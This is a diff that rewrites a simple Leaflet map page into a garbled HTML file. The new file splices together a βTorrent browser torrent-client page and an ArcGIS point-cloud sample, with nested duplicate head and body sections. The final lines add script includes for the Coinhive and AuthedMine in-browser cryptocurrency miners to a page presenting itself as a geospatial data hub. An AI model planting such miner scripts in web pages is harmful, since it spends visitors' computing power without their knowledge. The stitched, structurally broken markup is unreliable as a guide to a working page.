@@ -1,27 +1,247 @@
-<html>
-    <head>
-        <title>geospatialDataStore</title>
-        
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
-        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>  
-        <link rel="stylesheet" href="https://unpkg.com/leaflet@1.5.1/dist/leaflet.css"
-            integrity="sha512-xwE/Az9zrjBIphAcBb3F6JVqxf46+CDLwfLMHloNu6KEQCAWi6HcDUbeOfBIptF7tcCzusKFjFw2yuvEpDL9wQ=="
-            crossorigin=""/>
-        <link rel="stylesheet" href="custom.css" />
-        <link rel="icon" type="image/icon" href="assets/planet.ico" />
-    </head>
-    <body>
-        <div class="container-fluid">
-            <h1>GeoSpacial DataStore</h1>
-            <div id="mapid"></div>
-            <div style="text-align:center">
-            <input type="text" placeholder="Search" aria-label="Search" />
-        </div>
-        </div>
-        
-        <script src="https://unpkg.com/leaflet@1.5.1/dist/leaflet.js"
-            integrity="sha512-GffPMF3RvMeYyc1LWMHtK8EbPv0iNZ8/oTtHPx9/cc2ILxQ+u905qIwdpULaqDkyBKgOaB57QTMg7ztg8Jm2Og=="
-            crossorigin=""></script>
-        <script src="app.js"></script>
-    </body>
+<!DOCTYPE html>
+<html ng-app="BTorrent" lang="en">
+<head>
+  <base href="">
+  <meta charset="UTF-8">
+  <title>βTorrent: Browser WebTorrent Client</title>
+  <meta name="description" content="βTorrent is the first fully-featured Browser WebTorrent Client">
+  <meta name="keywords" content="βTorrent, btorrent, client, webtorrent, browser, torrent, stream, bittorrent, torrenting, sharing, filesharing">
+  <meta name="author" content="Diego Rodríguez Baquero - DiegoRBaquero">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="trafficjunky-site-verification" content="rs9noatvt" />
+  <script
+      src="https://cdn.jsdelivr.net/g/webtorrent@0,momentjs@2,angularjs@1.5(angular.min.js+angular-route.min.js+angular-sanitize.min.js),angular.ui-grid@3.1,angular.ng-notify@0.8,angular.file-upload@12"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/g/normalize@3.0,skeleton@2.0,angular.ng-notify@0.8(ng-notify.min.css)">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/fontawesome/4.6/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/angular.ui-grid/3.1/ui-grid.min.css">
+  <link rel="stylesheet" href="style.css">
+</head>
+<body ng-controller="BTorrentCtrl" ng-cloak="">
+
+
+<header>   
+  <h1>
+        <b>GeospatialDataHub</b>
+        <a href="point_cloud.html">Point Cloud</a>
+  </h1>
+</header> 
+
+
+<head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="initial-scale=1,maximum-scale=1,user-scalable=no"
+    />
+    <!--
+  ArcGIS API for JavaScript, https://js.arcgis.com
+  For more information about the layers-pointcloud sample, read the original sample description at developers.arcgis.com.
+  https://developers.arcgis.com/javascript/latest/sample-code/layers-pointcloud/index.html
+  -->
+<title>PointCloudLayer - toggle renderers - 4.12</title>
+    <style>
+      html,
+      body,
+      #viewDiv {
+        padding: 0;
+        margin: 0;
+        height: 80%;
+        width: 100%;
+      }
+      #paneDiv {
+        padding: 12px;
+        background-color: rgba(255, 255, 255, 0.9);
+        border: 1px solid rgb(14, 13, 13);
+        color: black;
+      }
+    </style>
+
+    <link
+      rel="stylesheet"
+      href="https://js.arcgis.com/4.12/esri/themes/light/main.css"
+    />
+    <script src="https://js.arcgis.com/4.12/"></script>
+
+    <script>
+      require([
+        "esri/Map",
+        "esri/views/SceneView",
+        "esri/layers/PointCloudLayer",
+        "esri/renderers/smartMapping/creators/color",
+        "esri/renderers/smartMapping/creators/type",
+        "esri/widgets/Legend",
+        "esri/core/promiseUtils"
+      ], function(
+        Map,
+        SceneView,
+        PointCloudLayer,
+        colorRendererCreator,
+        typeRendererCreator,
+        Legend,
+        promiseUtils
+      ) {
+        // Create Point Cloud Layer
+        var pcLayer = new PointCloudLayer({
+          url:
+            "https://tiles.arcgis.com/tiles/V6ZHFr6zdgNZuVG0/arcgis/rest/services/BARNEGAT_BAY_LiDAR_UTM/SceneServer"
+        });
+
+        // Create Map and View
+        var map = new Map({
+          basemap: "gray-vector",
+          ground: "world-elevation"
+        });
+
+        var view = new SceneView({
+          container: "viewDiv",
+          map: map,
+          camera: {
+            heading: 210,
+            tilt: 78,
+            position: {
+              x: -8249335,
+              y: 4832005,
+              z: 50.7,
+              spatialReference: {
+                wkid: 3857
+              }
+            }
+          }
+        });
+        view.ui.add("paneDiv", "bottom-left");
+        view.ui.add(
+          new Legend({
+            view: view
+          }),
+          "bottom-right"
+        );
+
+        // stores generated renderers to avoid making service
+        // calls for the same renderer multiple times
+        var renderersByField = {
+          RGB: null,
+          CLASS_CODE: null,
+          ELEVATION: null,
+          INTENSITY: null
+        };
+
+        /**
+         * Generates renderers based on the input field name. There are four
+         * valid input field names: RGB, CLASS_CODE, ELEVATION, and INTENSITY
+         */
+        function getRenderer(fieldName) {
+          // If the renderer is already generated, then return it
+          if (renderersByField[fieldName]) {
+            return promiseUtils.resolve(renderersByField[fieldName]);
+          }
+
+          // Store the generated renderer in a predefined object in
+          // case it is requested in the future and return the renderer
+          function responseCallback(response) {
+            renderersByField[fieldName] = response.renderer;
+            return response.renderer;
+          }
+
+          if (fieldName === "RGB") {
+            return colorRendererCreator
+              .createPCTrueColorRenderer({
+                layer: pcLayer
+              })
+              .then(responseCallback);
+          }
+          if (fieldName === "CLASS_CODE") {
+            return typeRendererCreator
+              .createPCClassRenderer({
+                layer: pcLayer,
+                field: fieldName
+              })
+              .then(responseCallback);
+          }
+          if (fieldName === "ELEVATION" || "INTENSITY") {
+            return colorRendererCreator
+              .createPCContinuousRenderer({
+                layer: pcLayer,
+                field: fieldName
+              })
+              .then(responseCallback);
+          }
+        }
+
+        /******************************************************************
+         *
+         * Display point cloud layer using different renderers
+         *
+         ******************************************************************/
+
+        view.when(function() {
+          // Generate RGB renderer when view is ready and
+          // assign the renderer to the point cloud layer
+          getRenderer("RGB")
+            .then(function(renderer) {
+              pcLayer.renderer = renderer;
+              map.add(pcLayer);
+            })
+            .catch(function(error) {
+              console.log("error: ", error);
+            });
+
+          var radios = document.getElementsByName("renderer");
+          // Handle change events on radio buttons to switch to the correct renderer
+          for (var i = 0; i < radios.length; i++) {
+            radios[i].addEventListener("change", function(event) {
+              var fieldName = event.target.value;
+              getRenderer(fieldName)
+                .then(function(renderer) {
+                  pcLayer.renderer = renderer;
+                })
+                .catch(function(error) {
+                  console.log("error: ", error);
+                });
+            });
+          }
+        });
+      });
+    </script>
+  </head>
+
+  <body>
+    <div id="viewDiv"></div>
+    <div id="paneDiv" class="esri-widget">
+      <p>Visualize point cloud using:</p>
+      <input type="radio" name="renderer" value="RGB" checked /> Original point
+      cloud scan color (Point Cloud RGB Renderer)<br />
+      <input type="radio" name="renderer" value="CLASS_CODE" /> LAS
+      classification (Point Cloud Unique Values Renderer)<br />
+      <input type="radio" name="renderer" value="ELEVATION" /> Elevation mapped
+      on a continuous color scheme (Point Cloud Stretch Renderer)<br />
+      <input type="radio" name="renderer" value="INTENSITY" /> A classification
+      based on intensity values (Point Cloud Stretch Renderer)<br />
+    </div>
+  </body>
+
+
+
+
+
+
+<header>
+  <h1>βTorrent<span class="version"> v{{$root.version}}</span></h1>
+  <div class="views" ng-show="$root.client.torrents.length == 0"><a ng-href="/#">Full</a> | <a ng-href="/download">Single Download</a> | <a ng-href="/view">Stream / View</a></div>
+  <div class="aligncenter" style="width: 468px; display: inline-block;">
+  </div>
+</header>
+<div id="viewer" ng-style="$root.viewerStyle"></div>
+<div id="view" ng-view></div>
+<footer>
+  <a class="button" href="https://github.com/DiegoRBaquero/BTorrent/issues" target="_blank"><i class="fa fa-github"></i> Suggest a feature / Report a bug <i class="fa fa-comment"></i></a><br>
+  <b>βTorrent is an FOSS project made with <span style="color: red">♥</span> by <a href="https://diegorbaquero.com" target="_blank" style="text-decoration: none">DiegoRBaquero</a></b><br>
+  <b> <a href="https://tracker.btorrent.xyz/stats" target="_blank">βTorrent's Tracker Stats</a></b><br>
+  Powered by <a href="https://github.com/webtorrent/webtorrent" target="_blank">WebTorrent</a><br>
+  </div>
+</footer>
+<div class="spinner" ng-show="client.processing"><i class="fa fa-spinner fa-spin spinner-icon"></i></div>
+<script src="app.js"></script>
+<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+</body>
 </html>
